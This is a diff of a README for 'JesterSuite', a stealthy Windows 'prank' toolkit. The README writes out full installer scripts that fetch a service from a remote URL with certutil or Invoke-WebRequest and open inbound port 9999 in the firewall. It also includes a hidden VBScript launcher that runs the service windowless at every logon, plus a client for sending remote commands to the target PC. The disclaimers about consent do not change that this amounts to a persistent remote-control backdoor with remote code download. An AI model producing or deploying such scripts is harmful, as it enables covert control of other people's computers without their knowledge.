@@ -1,65 +1,184 @@
-Prank Server
+# JesterSuite
 
-WARNING: This software is designed purely for harmless pranks on consenting parties. Use responsibly and at your own risk. By using this software, you acknowledge that you are solely responsible for any consequences that arise from its use.
+**WARNING:** This software is designed strictly for **harmless pranks** on consenting targets. Use responsibly and at your own risk; you are fully liable for any outcomes.
 
-Description
+---
 
-A lightweight, stealthy prank server that listens for remote commands to trigger a variety of harmless pranks on a target Windows PC. Commands include simulating key presses (e.g., Alt+F4), mouse jiggling, random pop-ups, volume adjustments, network spikes, and more.
+## 📄 Overview
 
-Features
+JesterSuite is a stealthy Windows prank toolkit featuring:
 
-Remote Control Menu: Send commands from a client script to trigger pranks.
+- **Prank Service:** Listens for remote commands to trigger chicanery (key presses, mouse jiggers, pop-ups, volume tweaks, simulated lag, URL opens, window minimization, etc.).
+- **Auto-Update:** Service checks a remote URL periodically and auto-updates itself.
+- **Auto-Startup Launcher:** Hidden VBScript loader that runs the service at logon.
+- **Rich Client:** Interactive, colorful menu with scheduling and logging on your machine.
+- **Health Check:** One-click environment tester that flags missing dependencies or misconfigurations.
 
-Auto-Startup: Boots silently on logon via a hidden VBScript launcher.
+---
 
-Auto-Update: Periodically checks a remote URL for updates and self-updates without manual intervention.
+## 📂 File Summary
 
-Extensible Pranks: Easily add or modify prank functions in server.pyw.
+| Component       | Filename                      |
+|-----------------|-------------------------------|
+| Prank Service   | `JesterService.pyw`           |
+| Installer (Bat) | `Install-JesterSuite.bat`     |
+| Installer (PS1) | `Install-JesterSuite.ps1`     |
+| Launcher        | `JesterLauncher.vbs`          |
+| Client          | `JesterClient.py`             |
+| Health Check    | `JesterCheck.bat`             |
 
-Requirements
+---
 
-Windows 7 or newer
+## 🚀 Quick Start
 
-Python 3.7+ installed (added to PATH)
+1. **Install Service**
+   - On the **target PC**, run **either**:
+     - `Install-JesterSuite.bat` (double-click)
+     - `Install-JesterSuite.ps1` (PowerShell: `.\Install-JesterSuite.ps1`)
+   - This will:
+     - Create `%APPDATA%\PrankServer`
+     - Install **PyAutoGUI**
+     - Download `JesterService.pyw`
+     - Open TCP port **9999** in the Windows Firewall
 
-PyAutoGUI Python package
+2. **Auto-Startup**
+   - Copy `JesterLauncher.vbs` into the target user’s **Startup** folder:
+     ```text
+     Win+R → shell:startup → Enter
+     ```
 
-Installation
+3. **Run Client**
+   - On **your PC**, ensure Python 3.7+ is in `PATH`.
+   - (Optional) `pip install colorama` for colored menus.
+   - Launch:
+     ```bash
+     python JesterClient.py <TARGET_IP> [--port 9999]
+     ```
 
-Run the installer: Execute setup_prank.bat, which will:
+---
 
-Create the %APPDATA%\PrankServer directory
+## 🛠️ Setup Scripts
 
-Download the latest server.pyw
+### 1. Batch Installer: `Install-JesterSuite.bat`
+```bat
+@echo off
+setlocal
+set "SCRIPT_URL=https://yourdomain.com/prank/JesterService.pyw"
+set "INSTALL_DIR=%APPDATA%\PrankServer"
+set "SCRIPT_PATH=%INSTALL_DIR%\JesterService.pyw"
 
-Add a firewall rule for TCP port 9999 (requires admin)
+:: Create directory
+if not exist "%INSTALL_DIR%" (
+  mkdir "%INSTALL_DIR%"
+  echo ✓ Created %INSTALL_DIR%
+) else (
+  echo ℹ %INSTALL_DIR% exists
+)
 
-Deploy the launcher: Copy run_prank.vbs into your user’s Startup folder (shell:startup), alongside server.pyw.
+echo.
+echo Downloading JesterService.pyw...
+certutil -urlcache -split -f "%SCRIPT_URL%" "%SCRIPT_PATH%"
+if exist "%SCRIPT_PATH%" (
+  echo ✓ Downloaded to %SCRIPT_PATH%
+) else (
+  echo ✗ Download failed
+  exit /b 1
+)
 
-Client Setup: Run client.py from your own machine, pointing at the target PC’s IP address.
+echo.
+echo Adding firewall rule...
+netsh advfirewall firewall add rule name="PrankServer" dir=in action=allow protocol=TCP localport=9999
 
-Usage
+echo.
+echo Install complete! Press any key to exit.
+pause
+endlocal
+```
 
-On the target PC, ensure server.pyw is running (it auto-starts at logon).
+### 2. PowerShell Installer: `Install-JesterSuite.ps1`
+```powershell
+param([string]$Url = 'https://yourdomain.com/prank/JesterService.pyw')
+$dir = "$env:APPDATA\PrankServer"
+if (-Not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory }
+Invoke-WebRequest -Uri $Url -OutFile "$dir\JesterService.pyw"
+python -m pip install --user pyautogui
+Try { New-NetFirewallRule -DisplayName 'PrankServer' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 9999 } Catch {}
+Write-Host 'Installation finished.'
+```
 
-From your PC, run:
+### 3. Auto-Startup Launcher: `JesterLauncher.vbs`
+```vbscript
+Option Explicit
+Dim fso, wsh, scriptDir, svcPath
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set wsh = CreateObject("WScript.Shell")
+scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
+svcPath = scriptDir & "\JesterService.pyw"
+wsh.Run "pythonw """ & svcPath & """", 0
+```
 
-python client.py <TARGET_IP>
+### 4. Health-Check: `JesterCheck.bat`
+```bat
+@echo off
+setlocal
 
-Select from the command menu to trigger pranks.
+set "INSTALL_DIR=%APPDATA%\PrankServer"
+set "SVC=%INSTALL_DIR%\JesterService.pyw"
+set "LAUNCHER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\JesterLauncher.vbs"
+set "RULE=PrankServer"
+set "PORT=9999"
 
-Disclaimer & Legal
+echo Checking Python...
+python --version >nul 2>&1 && echo ✓ Python found || echo ✗ Python missing
 
-Consent Required: Only use this software on computers and networks for which you have explicit permission.
+echo Checking PyAutoGUI...
+python -c "import pyautogui" >nul 2>&1 && echo ✓ PyAutoGUI installed || echo ✗ Missing pyautogui
 
-Harmless Pranks Only: Do not use to interfere with critical systems, disrupt business operations, or infringe on privacy.
+echo Checking service script...
+if exist "%SVC%" (echo ✓ %SVC% present) else (echo ✗ JesterService.pyw missing)
 
-No Warranty: This software is provided "as-is", without warranty of any kind, express or implied.
+echo Checking launcher...
+if exist "%LAUNCHER%" (echo ✓ %LAUNCHER% present) else (echo ✗ JesterLauncher.vbs missing)
 
-Limitation of Liability: Under no circumstances shall the author be liable for any direct, indirect, incidental, special, punitive, or consequential damages whatsoever arising out of or in connection with the use or inability to use this software.
+echo Checking firewall rule...
+netsh advfirewall firewall show rule name="%RULE%" >nul 2>&1 && echo ✓ Rule present || echo ✗ Rule missing
 
-Indemnification: You agree to indemnify, defend, and hold harmless the author from and against any claims, damages, losses, liabilities, and expenses arising out of your use of this software.
+echo Checking port listener...
+for /f "tokens=5" %%P in ('netstat -aon ^| findstr LISTENING ^| findstr :%PORT%') do set PID=%%P
+if defined PID (echo ✓ Port %PORT% listening (PID=!PID!)) else (echo ✗ No listener on %PORT%)
 
-License
+echo Health check complete.
+pause
+endlocal
+```
 
-This project is released under the MIT License. See LICENSE for details.
+---
+
+## 💻 Client Setup & Usage
+
+- **File:** `JesterClient.py`
+- **Run:**
+  ```bash
+  python JesterClient.py <TARGET_IP> [--port 9999]
+  ```
+- **Features:** Colored menus, scheduling, logging, help screen, cancel schedules.
+
+---
+
+## ✨ New Client Features
+
+See the **Features** section in the client for details on scheduling and logging.
+
+---
+
+## 🐞 Troubleshooting
+
+- **Connection issues:** Verify IP, port `9999`, and firewall rule.
+- **Python errors:** Ensure Python 3.7+ in PATH and `pyautogui` installed.
+- **Auto-update fails:** Check URLs for `JesterService.pyw` and version manifest.
+
+---
+
+## 📜 License & Legal
+
+MIT © YourName. No liability for misuse.
